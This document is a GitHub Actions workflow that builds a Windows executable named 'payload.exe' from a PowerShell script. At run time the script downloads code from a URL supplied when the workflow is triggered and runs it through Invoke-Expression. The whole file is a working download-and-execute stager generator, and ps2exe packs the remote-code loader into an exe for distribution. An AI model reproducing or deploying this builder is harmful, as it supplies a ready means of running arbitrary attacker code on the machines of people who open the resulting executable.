name: Convert PowerShell to EXE using ps2exe

on:
  workflow_dispatch:
    inputs:
      payload_url:
        description: 'URL to fetch PowerShell script'
        required: true
        type: string

jobs:
  build:
    runs-on: windows-latest

    steps:
    # Step 1: Checkout repository
    - name: Checkout Code
      uses: actions/checkout@v3

    # Step 2: Install ps2exe module
    - name: Install ps2exe Module
      shell: powershell
      run: Install-Module -Name ps2exe -Force -Scope CurrentUser

    # Step 3: Save PowerShell Script with Dynamic URL Injection
    - name: Save PowerShell Script with URL Injection
      shell: powershell
      run: |
        $script = @'
        function FetchScriptContent {
            param ([string]$scriptUrl)
            try {
                return Invoke-RestMethod -Uri $scriptUrl -TimeoutSec 10
            } catch {
                Write-Host "Error: Failed to fetch data from URL - $scriptUrl"
                return $null
            }
        }

        function ExecuteScript {
            param ([string]$scriptContent)
            try {
                Invoke-Expression $scriptContent
            } catch {
                Write-Host "Error: Failed to execute PowerShell command."
            }
        }

        $scriptUrl = "@{url}"

        if ($scriptUrl) {
            $scriptData = FetchScriptContent -scriptUrl $scriptUrl
            if ($scriptData) {
                ExecuteScript -scriptContent $scriptData
            } else {
                Write-Host "Error: No valid data received from the URL."
            }
        } else {
            Write-Host "Error: PAYLOAD_URL is not set."
        }
        '@ -replace "@{url}", "${{ github.event.inputs.payload_url }}"

        $script | Out-File -FilePath "payload.ps1" -Encoding utf8

    # Step 4: Convert PowerShell script to an EXE using ps2exe
    - name: Convert PowerShell Script to EXE
      shell: powershell
      run: ps2exe -inputFile '.\payload.ps1' -outputFile '.\payload.exe'

    # Step 5: List the contents of the output directory
    - name: List Directory Contents
      shell: powershell
      run: Get-ChildItem -Path .

    # Step 6: Upload the generated EXE as an artifact
    - name: Upload Executable
      uses: actions/upload-artifact@v4
      with:
        name: payload_exe
        path: payload.exe



